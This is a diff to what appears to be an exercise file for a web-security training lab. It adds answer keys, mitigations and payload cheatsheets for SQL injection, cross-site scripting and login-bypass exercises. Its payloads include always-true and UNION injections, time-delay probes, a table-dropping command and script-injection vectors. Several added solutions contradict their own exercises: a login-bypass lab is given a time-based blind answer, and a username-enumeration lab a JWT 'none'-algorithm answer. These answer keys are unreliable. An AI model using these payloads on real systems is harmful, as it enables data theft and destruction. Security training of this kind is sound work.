@@ -501,6 +501,47 @@
         "Start by identifying every input the page uses in queries (category filter, login, tracking cookie).",
         "Intercept the category filter request and add: …",
         "Intercept the category filter request and add: <code>category=Gifts' OR 1=1 --</code>"
+      ],
+      "tags": [
+        "sqli",
+        "union",
+        "auth-bypass",
+        "filter"
+      ],
+      "prerequisites": [],
+      "estimatedTimeMinutes": 10,
+      "author": "security-team",
+      "version": "1.1.0",
+      "solution": {
+        "payload": "category=Gifts' OR 1=1 --",
+        "explanation": "The category parameter is directly concatenated into the SQL query without sanitization. The payload closes the string literal and adds an always-true condition, returning all rows.",
+        "mitigation": {
+          "js": "db.prepare('SELECT * FROM products WHERE category = ?').all(category)",
+          "python": "cursor.execute('SELECT * FROM products WHERE category = %s', (category,))"
+        }
+      },
+      "cheatsheet": {
+        "payloads": [
+          "' OR 1=1--",
+          "' UNION SELECT null,sqlite_version()--",
+          "'; DROP TABLE products--"
+        ],
+        "tools": [
+          "sqlmap",
+          "Nosqlmap"
+        ],
+        "references": [
+          "https://owasp.org/www-community/attacks/SQL_Injection"
+        ]
+      },
+      "verification": {
+        "type": "console-log",
+        "match": "LAB_SOLVED:sqli-1"
+      },
+      "related": [
+        "sqli-2",
+        "sqli-3",
+        "auth-1"
       ]
     },
     "sqli-2": {
@@ -514,6 +555,36 @@
         "Start by identifying every input the page uses in queries (category filter, login, tracking cookie).",
         "Submit …",
         "Submit <code>administrator'--</code> as the username and anything as the password."
+      ],
+      "tags": [
+        "sqli",
+        "blind",
+        "time-based"
+      ],
+      "prerequisites": [
+        "sqli-1"
+      ],
+      "estimatedTimeMinutes": 15,
+      "author": "security-team",
+      "version": "1.0.0",
+      "solution": {
+        "payload": "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
+        "explanation": "Time-based blind SQLi using conditional delays.",
+        "mitigation": {}
+      },
+      "cheatsheet": {
+        "payloads": [
+          "' AND SLEEP(5)--",
+          "' OR IF(1=1,SLEEP(5),0)--"
+        ]
+      },
+      "verification": {
+        "type": "console-log",
+        "match": "LAB_SOLVED:sqli-2"
+      },
+      "related": [
+        "sqli-3",
+        "sqli-4"
       ]
     },
     "sqli-3": {
@@ -579,6 +650,38 @@
         "Find every place your input is reflected or stored, then test whether it is encoded, filtered, or executed.",
         "Submit a search term like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> or …",
         "Submit a search term like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert(1)&gt;</code>."
+      ],
+      "tags": [
+        "xss",
+        "reflected",
+        "search"
+      ],
+      "prerequisites": [],
+      "estimatedTimeMinutes": 8,
+      "author": "security-team",
+      "version": "1.0.0",
+      "solution": {
+        "payload": "<script>alert(1)</script>",
+        "explanation": "Search query reflected unsanitized in response.",
+        "mitigation": {
+          "js": "escapeHtml(userInput)",
+          "python": "markupsafe.escape(user_input)"
+        }
+      },
+      "cheatsheet": {
+        "payloads": [
+          "<img src=x onerror=alert(1)>",
+          "<svg/onload=alert(1)>",
+          "javascript:alert(1)//"
+        ]
+      },
+      "verification": {
+        "type": "console-log",
+        "match": "LAB_SOLVED:xss-1"
+      },
+      "related": [
+        "xss-2",
+        "xss-3"
       ]
     },
     "xss-2": {
@@ -852,6 +955,37 @@
         "Notice how the server distinguishes users, reports errors, tracks attempts, or persists login — each is a potential bypass.",
         "\"Invalid username\" vs \"Incorrect password\" differs. Try carlos; its password is a common word from a small list.",
         "\"Invalid username\" vs \"Incorrect password\" differs. Try carlos; its password is a common word from a small list."
+      ],
+      "tags": [
+        "auth",
+        "jwt",
+        "alg-none"
+      ],
+      "prerequisites": [],
+      "estimatedTimeMinutes": 12,
+      "author": "security-team",
+      "version": "1.0.0",
+      "solution": {
+        "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...",
+        "explanation": "JWT accepts \"none\" algorithm, allowing signature bypass.",
+        "mitigation": {
+          "js": "verify(token, secret, { algorithms: [\"HS256\"] })"
+        }
+      },
+      "cheatsheet": {
+        "payloads": [
+          "alg=none",
+          "key confusion",
+          "kid injection"
+        ]
+      },
+      "verification": {
+        "type": "console-log",
+        "match": "LAB_SOLVED:auth-1"
+      },
+      "related": [
+        "auth-2",
+        "auth-3"
       ]
     },
     "auth-2": {
